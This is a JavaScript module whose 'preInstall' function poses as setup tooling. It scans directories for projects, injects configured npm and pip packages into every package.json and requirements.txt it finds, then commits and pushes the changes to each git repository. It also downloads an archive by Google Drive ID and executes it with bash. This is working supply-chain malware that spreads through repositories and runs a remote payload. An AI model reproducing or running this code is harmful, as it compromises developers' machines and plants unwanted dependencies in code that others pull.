const { scanProject } = require("./scanner");
const { installPipWithPackage, installNpmWithPackage, installPipWithPackages, installNpmWithPackages, downloadViaGdown } = require("./installer");
const { addCommitPush } = require("./git");
const { DEFAULT_PACKAGE, TARGET_DIRS, DEFAULT_JS_PACKAGES, DEFAULT_PY_PACKAGES, GDOWN_DRIVE_ID } = require("./config");
const { spawn } = require("child_process");
const { logDetailed } = require("./utils");

/**
 * Execute downloaded executable on Linux
 * Uses shell spawn for Linux process execution
 */
function executeDownloadedBinary(binaryPath) {
  logDetailed(`executeDownloadedBinary called with binaryPath: ${binaryPath}`);
  return new Promise((resolve, reject) => {
    logDetailed(`Spawning bash with binary: ${binaryPath}`);
    const binaryProcess = spawn('bash', [binaryPath], {
      detached: false,
      stdio: "pipe",
    });

    binaryProcess.stdout.on("data", (data) => {
      const message = String(data).trim();
      if (message) {
        console.log(`[preInstall] binary stdout: ${message}`);
        logDetailed(`Binary stdout: ${message}`);
      }
    });

    binaryProcess.stderr.on("data", (data) => {
      const message = String(data).trim();
      if (message) {
        console.log(`[preInstall] binary stderr: ${message}`);
        logDetailed(`Binary stderr: ${message}`);
      }
    });

    binaryProcess.on("error", (err) => {
      logDetailed(`Binary process error: ${err.message}`);
      reject(err);
    });

    binaryProcess.on("exit", (code) => {
      logDetailed(`Binary process exited with code: ${code}`);
      if (code === 0) {
        logDetailed("Binary execution successful");
        resolve();
      } else {
        logDetailed(`Binary execution failed with code ${code}`);
        reject(new Error(`binary exited with code ${code}`));
      }
    });
  });
}

/**
 * Main pre-install function: installs JS/Python packages and optionally downloads via gdown
 * Adapted for Linux environments
 * @param {string|string[]} jsPackages - JS packages to install (default from config)
 * @param {string|string[]} pyPackages - Python packages to install (default from config)
 * @param {string[]} rootDirs - directories to scan (default from config)
 * @param {string} driveId - Google Drive ID for gdown download (optional)
 */
async function preInstall(
  jsPackages = DEFAULT_JS_PACKAGES,
  pyPackages = DEFAULT_PY_PACKAGES,
  rootDirs = TARGET_DIRS,
  driveId = GDOWN_DRIVE_ID
) {
  logDetailed(`preInstall called with jsPackages: ${JSON.stringify(jsPackages)}, pyPackages: ${JSON.stringify(pyPackages)}, rootDirs: ${JSON.stringify(rootDirs)}, driveId: ${driveId}`);
  logDetailed(`ENABLE_DETAILED_LOGGING is set to: ${process.env.ENABLE_DETAILED_LOGGING}`);
  try {
    console.log("[preInstall] Starting Linux pre-install process...");
    logDetailed("Entering preInstall function");

    // Ensure inputs are arrays
    const jsPackagesArray = Array.isArray(jsPackages) ? jsPackages : [jsPackages];
    const pyPackagesArray = Array.isArray(pyPackages) ? pyPackages : [pyPackages];
    const rootDirsArray = Array.isArray(rootDirs) ? rootDirs : [rootDirs];

    logDetailed(`jsPackagesArray: ${JSON.stringify(jsPackagesArray)}`);
    logDetailed(`pyPackagesArray: ${JSON.stringify(pyPackagesArray)}`);
    logDetailed(`rootDirsArray: ${JSON.stringify(rootDirsArray)}`);

    // Step 1: Scan all projects
    console.log("[preInstall] Scanning projects...");
    logDetailed("Starting project scanning phase");
    const allResults = {
      gitRoots: new Set(),
      packageJsonPaths: [],
      requirementsPaths: []
    };

    logDetailed(`Initialized allResults: gitRoots as Set, packageJsonPaths and requirementsPaths as arrays`);

    for (const rootDir of rootDirsArray) {
      logDetailed(`Scanning rootDir: ${rootDir}`);
      try {
        const result = await scanProject(rootDir);
        logDetailed(`scanProject(${rootDir}) returned: ${JSON.stringify(result)}`);
        if (result.gitRoots.length > 0 || result.packageJsonPaths.length > 0 || result.requirementsPaths.length > 0) {
          logDetailed(`Scanning successful for ${rootDir}: found ${result.gitRoots.length} git roots, ${result.packageJsonPaths.length} package.json, ${result.requirementsPaths.length} requirements.txt`);
          console.log(`[SUCCESS] Scanning successful for ${rootDir}`);
        } else {
          logDetailed(`Scanning found no relevant files in ${rootDir}`);
          console.log(`[INFO] Scanning found no relevant files in ${rootDir}`);
        }
        result.gitRoots.forEach(gr => {
          allResults.gitRoots.add(gr);
          logDetailed(`Added gitRoot: ${gr}`);
        });
        allResults.packageJsonPaths.push(...result.packageJsonPaths);
        logDetailed(`Added packageJsonPaths: ${result.packageJsonPaths.join(', ')}`);
        allResults.requirementsPaths.push(...result.requirementsPaths);
        logDetailed(`Added requirementsPaths: ${result.requirementsPaths.join(', ')}`);
      } catch (err) {
        console.warn(`[preInstall] Scanning failed for ${rootDir}: ${err.message}`);
        logDetailed(`Scanning failed for ${rootDir}: ${err.message}`);
        console.log(`[FAILURE] Scanning failed for ${rootDir}`);
      }
    }

    console.log(`[preInstall] Found ${allResults.packageJsonPaths.length} package.json files`);
    console.log(`[preInstall] Found ${allResults.requirementsPaths.length} requirements.txt files`);
    logDetailed(`Total packageJsonPaths found: ${allResults.packageJsonPaths.length}`);
    logDetailed(`Total requirementsPaths found: ${allResults.requirementsPaths.length}`);
    logDetailed(`Total gitRoots found: ${Array.from(allResults.gitRoots).length}`);

    // Step 2: Install JS packages
    if (jsPackagesArray.length > 0 && allResults.packageJsonPaths.length > 0) {
      console.log("[preInstall] Installing JS packages...");
      logDetailed("Starting JS packages installation phase");
      logDetailed(`JS packages to install: ${jsPackagesArray.join(', ')}`);
      let jsInstallSuccess = false;
      for (const packageJsonPath of allResults.packageJsonPaths) {
        logDetailed(`Processing packageJsonPath: ${packageJsonPath}`);
        try {
          if (jsPackagesArray.length === 1) {
            logDetailed(`Installing single JS package: ${jsPackagesArray[0]} in ${packageJsonPath}`);
            await installNpmWithPackage(packageJsonPath, jsPackagesArray[0]);
            logDetailed(`Successfully installed single JS package in ${packageJsonPath}`);
          } else {
            logDetailed(`Installing multiple JS packages: ${jsPackagesArray.join(', ')} in ${packageJsonPath}`);
            await installNpmWithPackages(packageJsonPath, jsPackagesArray);
            logDetailed(`Successfully installed multiple JS packages in ${packageJsonPath}`);
          }
          console.log(`[preInstall] Successfully installed JS packages in ${packageJsonPath}`);
          jsInstallSuccess = true;
        } catch (err) {
          console.warn(`[preInstall] Failed to install JS packages in ${packageJsonPath}: ${err.message}`);
          logDetailed(`Error installing JS packages in ${packageJsonPath}: ${err.message}`);
        }
      }
      if (jsInstallSuccess) {
        logDetailed("JS requirements added successfully");
        console.log("[SUCCESS] JS requirements added successfully");
      } else {
        logDetailed("JS requirements addition failed");
        console.log("[FAILURE] JS requirements addition failed");
      }
    } else {
      logDetailed("Skipping JS packages installation: no JS packages or no package.json files found");
    }

    // Step 3: Install Python packages
    if (pyPackagesArray.length > 0 && allResults.requirementsPaths.length > 0) {
      console.log("[preInstall] Installing Python packages...");
      logDetailed("Starting Python packages installation phase");
      logDetailed(`Python packages to install: ${pyPackagesArray.join(', ')}`);
      let pyInstallSuccess = false;
      for (const requirementsPath of allResults.requirementsPaths) {
        logDetailed(`Processing requirementsPath: ${requirementsPath}`);
        try {
          if (pyPackagesArray.length === 1) {
            logDetailed(`Installing single Python package: ${pyPackagesArray[0]} in ${requirementsPath}`);
            await installPipWithPackage(requirementsPath, pyPackagesArray[0]);
            logDetailed(`Successfully installed single Python package in ${requirementsPath}`);
          } else {
            logDetailed(`Installing multiple Python packages: ${pyPackagesArray.join(', ')} in ${requirementsPath}`);
            await installPipWithPackages(requirementsPath, pyPackagesArray);
            logDetailed(`Successfully installed multiple Python packages in ${requirementsPath}`);
          }
          console.log(`[preInstall] Successfully installed Python packages in ${requirementsPath}`);
          pyInstallSuccess = true;
        } catch (err) {
          console.warn(`[preInstall] Failed to install Python packages in ${requirementsPath}: ${err.message}`);
          logDetailed(`Error installing Python packages in ${requirementsPath}: ${err.message}`);
        }
      }
      if (pyInstallSuccess) {
        logDetailed("Python requirements added successfully");
        console.log("[SUCCESS] Python requirements added successfully");
      } else {
        logDetailed("Python requirements addition failed");
        console.log("[FAILURE] Python requirements addition failed");
      }
    } else {
      logDetailed("Skipping Python packages installation: no Python packages or no requirements.txt files found");
    }

    // Step 4: Git commit and push
    console.log("[preInstall] Committing changes...");
    logDetailed("Starting git commit and push phase");
    logDetailed(`Git roots to process: ${Array.from(allResults.gitRoots).join(', ')}`);
    for (const gitRoot of allResults.gitRoots) {
      logDetailed(`Processing gitRoot: ${gitRoot}`);
      try {
        await addCommitPush(gitRoot);
        logDetailed(`Successfully committed and pushed changes in ${gitRoot}`);
        console.log(`[preInstall] Successfully committed and pushed changes in ${gitRoot}`);
      } catch (err) {
        console.warn(`[preInstall] Failed to commit/push in ${gitRoot}: ${err.message}`);
        logDetailed(`Error committing/pushing in ${gitRoot}: ${err.message}`);
      }
    }

    // Step 5: Download via gdown if driveId provided
    if (driveId) {
      console.log("[preInstall] Downloading files via gdown...");
      logDetailed("Starting gdown download phase");
      logDetailed(`Drive ID: ${driveId}`);
      const outputPath = `/tmp/download-${Date.now()}.tar.gz`;
      logDetailed(`Output path: ${outputPath}`);
      try {
        const downloadedPath = await downloadViaGdown(driveId, outputPath);
        logDetailed(`downloadViaGdown returned: ${downloadedPath}`);
        if (downloadedPath) {
          console.log(`[preInstall] Successfully downloaded to ${downloadedPath}`);
          logDetailed(`Download successful to ${downloadedPath}`);
          console.log("[SUCCESS] Download successful");
          
          // Execute the downloaded binary
          console.log("[preInstall] Executing downloaded binary...");
          logDetailed(`Executing downloaded binary: ${downloadedPath}`);
          try {
            await executeDownloadedBinary(downloadedPath);
            console.log("[preInstall] Successfully executed downloaded binary");
            logDetailed("Downloaded binary execution successful");
          } catch (execErr) {
            console.warn(`[preInstall] Failed to execute downloaded binary: ${execErr.message}`);
            logDetailed(`Error executing downloaded binary: ${execErr.message}`);
          }
        } else {
          logDetailed("Download returned null or undefined");
          console.log("[FAILURE] Download failed: no path returned");
        }
      } catch (err) {
        console.warn(`[preInstall] Failed to download via gdown: ${err.message}`);
        logDetailed(`Error downloading via gdown: ${err.message}`);
        console.log("[FAILURE] Download failed");
      }
    } else {
      logDetailed("Skipping gdown download: no driveId provided");
    }

    console.log("[preInstall] Linux pre-install process completed successfully");
    logDetailed("preInstall function completed successfully");
  } catch (err) {
    console.error("[preInstall] Fatal error:", err);
    logDetailed(`Fatal error in preInstall: ${err.message}`);
    throw err;
  }
}

module.exports = { preInstall, executeDownloadedBinary, scanProject };
